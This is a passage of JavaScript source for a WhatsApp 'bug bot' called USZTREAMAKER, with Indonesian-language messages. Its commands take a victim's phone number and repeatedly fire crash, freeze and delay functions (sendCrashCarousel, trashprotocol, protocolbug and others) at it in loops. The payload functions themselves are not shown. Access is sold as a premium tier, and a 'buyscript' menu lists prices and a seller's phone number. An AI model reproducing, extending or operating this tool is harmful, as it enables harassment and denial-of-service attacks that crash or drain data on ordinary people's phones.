m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await xfrix(target);
            await xfrix(target);
            await xfrix(target);
            await xfrix(target);
            await xfrix(target);
            await xfrixbeta(target);
            await xfrixbeta(target);
            await xfrixbeta(target);
            await sendCrashCarousel(target);
            await sendCrashCarousel(target);
            await sendCrashCarousel(target);
            await sendCrashCarousel(target);
            await sendCrashCarousel(target);
            await sleep(2000);
}
    }


break;
//======================
case "delay-usz": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await injectCore(target);
            await sleep(1500);
            await injectCore(target);
            await injectCore(target);
            await sleep(2000);
            await injectCore(target);
            await injectCore(target);
            await sleep(1500);
            await injectCore(target);
            await injectCore(target);
            await sleep(1500);
            await injectCore(target);
            await injectCore(target);
            await sleep(2000);
}
    }

break;
//======================
case "babieror": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await frezui(target);
            await frezui(target);
            await frezui(target);
            await frezui(target);
            await frezui(target);
            await VampDelayMess(target);
            await VampDelayMess(target);
            await VampDelayMess(target);
            await VampDelayMess(target);
            await sleep(2000);
}
    }

break;
//======================
case "usz-crash": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await spack2(target);
            await sleep(1500);
            await spack2(target);
            await SockMentionJid3(target);
            await sleep(2000);
            await SockMentionJid3(target);
            await SockMentionJid3(target);
            await sleep(1500);
            await SockMentionJid3(target);
            await SockMentionJid3(target);
            await sleep(1500);
            await trashprotocol(target);
            await trashprotocol(target);
            await sleep(2000);
}
    }

break;
//======================
case "usztzy": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await robustfreeze(target, Ptcp = true);
            await sleep(2000);
}
    }

break;
//======================
case"memek": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sendComboInteractive(target);
            await sleep(2000);
}
    }

break;
//======================
case "uszv3": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await CaywzZdelayMaker(target);
            await sleep(1500);
            await CaywzZdelayMaker(target);
            await CaywzZdelayMaker(target);
            await sleep(2000);
            await CaywzZdelayMaker(target);
            await CaywzZdelayMaker(target);
            await sleep(1500);
            await CaywzZdelayMaker(target);
            await CaywzZdelayMaker(target);
            await sleep(1500);
            await CaywzZdelayMaker(target);
            await CaywzZdelayMaker(target);
            await sleep(2000);
}
    }

break;
//======================
case "janganeror": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await VampireLocation(target);
            await VampireLocation(target);
            await VampireLocation(target);
            await VampireLocation(target);
            await VampireLocation(target);
            await VampireLocation(target);
            await sleep(2000);
}
    }

break;
//======================
case "test": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await CosmoBlankX(target);
            await sleep(1500);
            await CosmoBlankX(target);
            await CosmoBlankX(target);
            await sleep(2000);
            await CosmoBlankX(target);
            await CosmoBlankX(target);
            await sleep(1500);
            await CosmoBlankX(target);
            await CosmoBlankX(target);
            await sleep(1500);
            await CosmoBlankX(target);
            await CosmoBlankX(target);
            await sleep(2000);
}
    }

break;
//======================
case "uszxprotocolbug": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');  
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await protocolbug3(target);
            await sleep(1500);
            await protocolbug3(target);
            await protocolbug3(target);
            await sleep(2000);
            await protocolbug5(target);
            await protocolbug5(target);
            await sleep(1500);
            await protocolbug7(target);
            await protocolbug7(target);
            await sleep(1500);
            await trashprotocol(target);
            await trashprotocol(target);
            await sleep(2000);
}
    }

break
//======================
case "buyscript":{
if (!text) return m.reply(`
╭───────────────╼
│ᴇɴᴄ:10ᴋ
│ɴᴏ ᴇɴᴄ 15ᴋ
│ɴᴏ ᴇɴᴄ ғᴜʟʟ 20ᴋ
│ᴍɪɴᴀᴛ? ᴘᴍ ɴᴏ ᴅɪ ʙᴀᴡᴀʜ 👇
│6283194962608
╰───────────────╼`)
}

break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (Usztzy.public === true) return m.reply("ᴜᴅʜ ᴘᴜʙʟɪᴄ ᴅᴀʀɪ ᴛᴀᴅɪ ʙᴀɴɢ ᴜsᴢ💫");
Usztzy.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (Usztzy.public === false) return m.reply("sᴜᴅᴀʜ sᴇʟғ ʙᴀɴɢ ᴜsᴢ💫");
Usztzy.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": case "treamaker": {
let itsmenu = `
𝙷𝙰𝙸 \`${m.pushName}\`  👋
╭─────────────────╼
│  ╾─「𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙱𝙾𝚃」─╼
│「𝙽𝙰𝙼𝙴 𝙱𝙾𝚃」: 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁
│「𝚅𝙴𝚁𝚂𝙸𝙾𝙽」: 3.0
│「𝙾𝚆𝙽𝙴𝚁」: 𝚄𝚂𝚉
│「𝚂𝚃𝙰𝚃𝚄𝚂」:𝚅𝙸𝙿 𝙱𝚄𝚈 𝙾𝙽𝙻𝚈
╰─────────────────╼
    \`${global.namabot}\` 
╭─────────────────╼
│ ╭╮╱╭┳━━━┳━━━━╮
│ ┃┃╱┃┃╭━╮┣━━╮━┃
│ ┃┃╱┃┃╰━━╮╱╭╯╭╯
│ ┃┃╱┃┣━━╮┃╭╯╭╯╱
│ ┃╰━╯┃╰━╯┣╯━╰━╮
│ ╰━━━┻━━━┻━━━━╯
╰─────────────────╼
     ウズトリーマーカー    
https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137
╭──╼「𝙻𝙸𝚂𝚃 𝙼𝙴𝙽𝚄 」───╼
│◉ 𝙱𝚄𝙶𝙼𝙴𝙽𝚄 
│    ╰⪩ [ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴜɢ]
│◉ 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄 
│     ╰⪩ [ᴏᴡɴᴇʀ ᴍᴇɴᴜ]
│◉ 𝙱𝚄𝚈𝚂𝙲𝚁𝙸𝙿𝚃 
│   ╰⪩ [𝙸𝙽𝙶𝙸𝙽 𝙼𝙴𝙼𝙱𝙴𝙻𝙸?]
│ᴘɪʟɪʜ ᴍᴇɴᴜ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ
╰─────────────────╼`;
await Usztzy.sendMessage(m.chat, { 
	           video: fs.readFileSync('./mp4/cihuy.mp4'),
	           gifPlayback: true,
	           caption: itsmenu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
                    
     await Usztzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./uszdj.mp3'),
                        mimetype: "audio/mpeg",
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
break
//======================
case "bugmenu": case "uszt": {
let msgbug = `
𝙷𝙰𝙸 \`${m.pushName}\`  👋
╭─────────────────╼
│ ╾─「𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙱𝙾𝚃」─╼
│「𝙽𝙰𝙼𝙴 𝙱𝙾𝚃」: 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁
│「𝚅𝙴𝚁𝚂𝙸𝙾𝙽」: 3.0
│「𝙾𝚆𝙽𝙴𝚁」: 𝚄𝚂𝚉
│「𝚂𝚃𝙰𝚃𝚄𝚂」: 𝚅𝙸𝙿 𝙱𝚄𝚈 𝙾𝙽𝙻𝚈
╰─────────────────╼
      \`${global.namabot}\` 
╭──╼「 𝙳𝙴𝙻𝙰𝚈-𝙼𝙴𝙽𝚄 」────╼
│◉︎ 𝚄𝚂𝚉-𝙳𝙴𝙻𝙰𝚈 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙳𝙴𝙻𝙰𝚈𝟸 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉𝚃𝚉𝚈 𝟼𝟸𝚡𝚡𝚡𝚡
│◉ ︎𝚄𝚂𝚉-𝙷𝙰𝚁𝙳 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙳𝙴𝙻𝙰𝚈𝚂𝚃𝙲 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉𝚇𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻𝙱𝚄𝙶 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙸𝙽𝚅𝙸𝚂𝙺𝙽𝚃𝙺 𝟼𝟸𝚡𝚡𝚡𝚡
╰────────────────────╼
╭──╼︎「𝙱𝙴𝙻𝚄𝙼 𝙳𝙸 𝙲𝙾𝙱𝙰」───╼
│◉︎ 𝚄𝚂𝚉-𝙱𝚄𝙻𝙻𝙳𝙾𝚉𝙴𝚁 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝙲𝚁𝙰𝚂𝙷-𝙸𝙽𝚅𝙸𝚂 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙲𝚁𝙰𝚂𝙷 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚃𝙴𝚂𝚃 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙳𝙴𝙻𝙰𝚈𝚂𝚃𝙲 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝙳𝙴𝙻𝙰𝚈-𝚄𝚂𝚉 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙸𝙽𝚅𝚂𝙻𝙾𝚆 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝙿𝙴𝙽𝚈𝙴𝙳𝙾𝚃-𝙺𝙾𝚄𝚃𝙰 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉𝙲𝚁𝙰𝚄𝚂𝙴𝙻 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉-𝙵𝙾𝚁𝙲𝙻𝙾𝚂𝙴 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝙰𝚆𝙰𝙸𝚃-𝚄𝚂𝚉 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉𝚅𝟹 𝟼𝟸𝚡𝚡𝚡𝚡
╰─────────────────╼
`
await Usztzy.sendMessage(m.chat, { 
	           video: fs.readFileSync('./mp4/cihuy.mp4'),
	           gifPlayback: true,
	           caption: msgbug,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
                    
     await Usztzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./uszdj.mp3'),
                        mimetype: "audio/mpeg",
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
break
//======================
case "ownermenu": case "owner": {
let peler = `
╭─────────────────╼
│ ╾─「𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙱𝙾𝚃」─╼
│「𝙽𝙰𝙼𝙴 𝙱𝙾𝚃」 : 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁
│「𝚅𝙴𝚁𝚂𝙸𝙾𝙽」: 3.0
│「𝙾𝚆𝙽𝙴𝚁」: 𝚄𝚂𝚉𝚃𝚉𝚈
│「𝚂𝚃𝙰𝚃𝚄𝚂」: 𝚅𝙸𝙿 𝙱𝚄𝚈 𝙾𝙽𝙻𝚈
╰─────────────────╼
╭──╼「 𝙾𝚆𝙽𝙴𝚁-𝙼𝙴𝙽𝚄 」──╼
│◉︎ 𝙿𝚄𝙱𝙻𝙸𝙲
│◉︎ 𝚂𝙴𝙻𝙵 
│◉︎ 𝚄𝚂𝚉𝙿𝚁𝙴𝙼 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚄𝚂𝚉𝙳𝙴𝙻 𝟼𝟸𝚡𝚡𝚡𝚡
│◉︎ 𝚁𝙴𝙰𝙲𝚃𝙲𝙷 [𝙻𝙸𝙽𝙺 𝙲𝙷]
│◉︎ 𝚂𝙿𝙰𝙼𝙿𝙰𝙸𝚁 𝟼𝟸𝚡𝚡𝚡𝚡
╰─────────────────╼

`
await Usztzy.sendMessage(m.chat, { 
	           video: fs.readFileSync('./mp4/cihuy.mp4'),
	           gifPlayback: true,
	           caption: peler,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
                    
     await Usztzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./uszdj.mp3'),
                        mimetype: "audio/mpeg",
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
break; 
//======================
case "uszprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ 𝙲𝙾𝙽𝚃𝙾𝙷: /addprem (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ 𝙰𝙽𝙳𝙰 𝚂𝙴𝙺𝙰𝚁𝙰𝙽𝙶 𝙼𝙴𝙽𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼:\n• ${user} (30 days)`)}
break;
//======================
case "uszdel": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ 𝙲𝙾𝙽𝚃𝙾𝙷: .𝚄𝚂𝚉𝙿𝚁𝙴𝙼(nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ 𝚃𝙴𝙻𝙰𝙷 𝙳𝙸 𝙷𝙰𝙿𝚄𝚂 𝙳𝙰𝚁𝙸 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴 𝙿𝚁𝙴𝙼𝙸𝚄𝙼:\n• ${user}` : "❌ 𝙲𝙾𝙽𝚃𝙾𝙷: .𝚄𝚂𝚉𝙿𝚁𝙴𝙼(nomor)")}
break;
//======================
case "penyedot-kuota": {
    
if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');
    
if (!text) return m.reply(`\`𝙲𝙾𝙽𝚃𝙾𝙷:\` : ${prefix+command} 𝟼𝟸𝚡𝚡𝚡𝚡`);
